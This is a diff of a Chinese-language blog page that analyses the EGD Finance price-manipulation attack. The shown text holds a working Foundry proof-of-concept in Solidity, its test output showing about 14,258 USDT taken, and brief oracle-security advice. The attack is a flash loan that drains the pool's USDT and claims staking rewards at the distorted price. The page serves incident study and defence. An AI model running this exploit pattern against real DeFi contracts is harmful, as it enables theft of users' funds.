-<p><code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code>函数是<a href="https://docs.pancakeswap.finance/code/smart-contracts/pancakeswap-exchange/v2/router-v2#swapexacttokensfortokenssupportingfeeontransfertokens" target="_blank" rel="noopener noreffer ">PancakeSwap</a>的一个交易函数，用于在两个代币之间进行兑换。</p>
+<p><code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code>函数是<a href="https://docs.pancakeswap.finance/code/smart-contracts/pancakeswap-exchange/v2/router-v2#swapexacttokensfortokenssupportingfeeontransfertokens" target="_blank" rel="external nofollow noopener noreferrer">PancakeSwap</a>的一个交易函数，用于在两个代币之间进行兑换。</p>
 <ul>
 <li><code>amountIn</code>：输入代币数量；</li>
 <li><code>amountOutMin</code>：输出代币数量的下限，防止交易价格波动过大导致交易失败；</li>
@@ -1085,8 +1110,8 @@
 <li>如果直接存在 A/B 交易对，则 path 数组为 [address(A), address(B)]。</li>
 <li>如果不存在 A/B 交易对，但存在 A/C 和 C/B 交易对，则 path 数组为 [address(A), address(C), address(B)]。</li>
 </ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
@@ -1243,7 +1268,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
@@ -1313,7 +1338,7 @@
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//将egd兑换成usdt
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">egd</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">usdt</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pancakeRouter</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
@@ -1344,15 +1369,15 @@
 </span></span><span class="line"><span class="cl">        <span class="n">stake</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//模拟2天后
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//贷款（价格操纵）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">            <span class="mi">99997600</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100000000</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">EGD_USDT_LPPool</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">borrowUSDT</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;abcd&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//将获得的egd换成usdt
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="s">&#34;i will apporve all edg coin to another contract:&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
@@ -1376,17 +1401,17 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">//贷款的回调函数
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span>
+</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">count1</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span>
 </span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//在价格不合理的时候领取质押奖励
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//归还贷款本金 + 5%手续费
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">fee</span> <span class="o">=</span> <span class="p">(</span><span class="n">count1</span> <span class="o">*</span> <span class="mi">500</span><span class="n">_000_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fee</span> <span class="o">=</span> <span class="p">(</span><span class="n">count1</span> <span class="o">*</span> <span class="mi">500</span><span class="n">_000_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">),</span>
 </span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">count1</span> <span class="o">+</span> <span class="n">fee</span><span class="p">)</span>
@@ -1394,28 +1419,26 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><blockquote>
 <p>注意:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">//贷款（价格操纵）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl">            <span class="mi">99997600</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100000000</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">99997600</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100000000</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>在到底借款多少(这里的99.9976%)需要微调, 防止最后获取的EDG的数量超过池子中的EDG总量而导致转账失败.</p>
 </blockquote>
 <p>输出:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -1443,56 +1466,90 @@
 </span></span><span class="line"><span class="cl">  i will apporve all edg coin to another contract: 5630136207606302655330000
 </span></span><span class="line"><span class="cl">  earned usdt (ether): 14258
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Test result: ok. 1 passed; 0 failed; finished in 666.79ms
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Test result: ok. 1 passed; 0 failed; finished in 666.79ms</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>套现 14258 $</p>
-<h2 id="相关">相关</h2>
-<h3 id="ethernaut-挑战">Ethernaut 挑战</h3>
-<p>在<code>Ethernaut</code>挑战中有一关和这个非常类似, 其是一个简化版本的价格操纵案例, 参考这里:</p>
-<p><a href="https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/22_Shop.md" target="_blank" rel="noopener noreffer ">https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/22_Shop.md</a></p>
-<h3 id="预言机安全性">预言机安全性</h3>
-<blockquote>
-<p>预言机的安全性等同于其数据源。 如果一个去中心化应用程序使用 Uniswap 作为其以太币/DAI 价格的预言机，攻击者就可以在 Uniswap 上篡改价格，以操纵该去中心化应用程序对当前价格的理解。 如何对付这个隐患的示例包括<a href="https://developer.makerdao.com/feeds/" target="_blank" rel="noopener noreffer ">一种推送系统</a>，如 MakerDAO 所使用的推送系统。它会将来自若干外部数据源的价格数据进行比对，而不是仅仅依靠单一来源。</p>
+<h2 class="heading-element" id="相关"><span>相关</span>
+  <a href="#%e7%9b%b8%e5%85%b3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="ethernaut-挑战"><span>Ethernaut 挑战</span>
+  <a href="#ethernaut-%e6%8c%91%e6%88%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在<code>Ethernaut</code>挑战中有一关和这个非常类似, 其是一个简化版本的价格操纵案例, 参考这里:</p>
+<p><a href="https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/22_Shop.md" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/22_Shop.md</a></p>
+<h3 class="heading-element" id="预言机安全性"><span>预言机安全性</span>
+  <a href="#%e9%a2%84%e8%a8%80%e6%9c%ba%e5%ae%89%e5%85%a8%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
+<p>预言机的安全性等同于其数据源。 如果一个去中心化应用程序使用 Uniswap 作为其以太币/DAI 价格的预言机，攻击者就可以在 Uniswap 上篡改价格，以操纵该去中心化应用程序对当前价格的理解。 如何对付这个隐患的示例包括<a href="https://developer.makerdao.com/feeds/" target="_blank" rel="external nofollow noopener noreferrer">一种推送系统</a>，如 MakerDAO 所使用的推送系统。它会将来自若干外部数据源的价格数据进行比对，而不是仅仅依靠单一来源。</p>
 </blockquote>
-<p>参考这里:  <a href="https://ethereum.org/zh/developers/docs/oracles/#security" target="_blank" rel="noopener noreffer ">https://ethereum.org/zh/developers/docs/oracles/#security</a></p>
+<p>参考这里:  <a href="https://ethereum.org/zh/developers/docs/oracles/#security" target="_blank" rel="external nofollow noopener noreferrer">https://ethereum.org/zh/developers/docs/oracles/#security</a></p>
 </div><div class="post-footer" id="post-footer">
-    <div class="post-info">
-        <div class="post-info-line">
-            <div class="post-info-mod">
-                <span>Updated on 2023-03-06</span>
-            </div></div>
-        <div class="post-info-line">
-            <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/analyse_of_egd_finance_attack/index.md" target="_blank">Read Markdown</a>
-                        </span></div>
-            <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析" data-hashtags="defi"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-hashtag="defi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
-            </div>
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="更新于 2023-03-06 15:09:31">更新于 2023-03-06&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/analyse_of_egd_finance_attack/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="vscode://file//Users/z/Documents/web3/05_blogs/yinhui1984.github.io/content/posts/analyse_of_EGD_Finance_attack.md" title="在编辑器中打开" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">在编辑器中打开</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析" data-hashtags="defi"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/analyse_of_egd_finance_attack/" data-hashtag="defi"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i class="fa-brands fa-hacker-news" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/analyse_of_egd_finance_attack/" data-title="EGD Finance 价格操纵攻击事件分析"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
         </div>
-    </div>
+      </div></div>
 
-    <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/defi/">defi</a></section>
-        <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
-        </section>
-    </div>
-
-    <div class="post-nav"><a href="/evm-puzzles/" class="prev" rel="prev" title="Evm Puzzles"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Evm Puzzles</a>
-            <a href="/uniswap/" class="next" rel="next" title="Uniswap">Uniswap<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/defi/" class="post-tag" title="标签 - Defi">Defi</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/evm-puzzles/" class="post-nav-item" rel="prev" title="Evm Puzzles"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>Evm Puzzles</a><a href="/uniswap/" class="post-nav-item" rel="next" title="Uniswap">Uniswap<i class="fa-solid fa-angle-right" aria-hidden="true"></i></a></div>
 </div>
-</article></div>
-            </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.118.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yinhui1984" target="_blank">zhouyinhui</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
-        </div>
-    </footer></div>
+</article>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
-            </a>
-        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":2000},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your 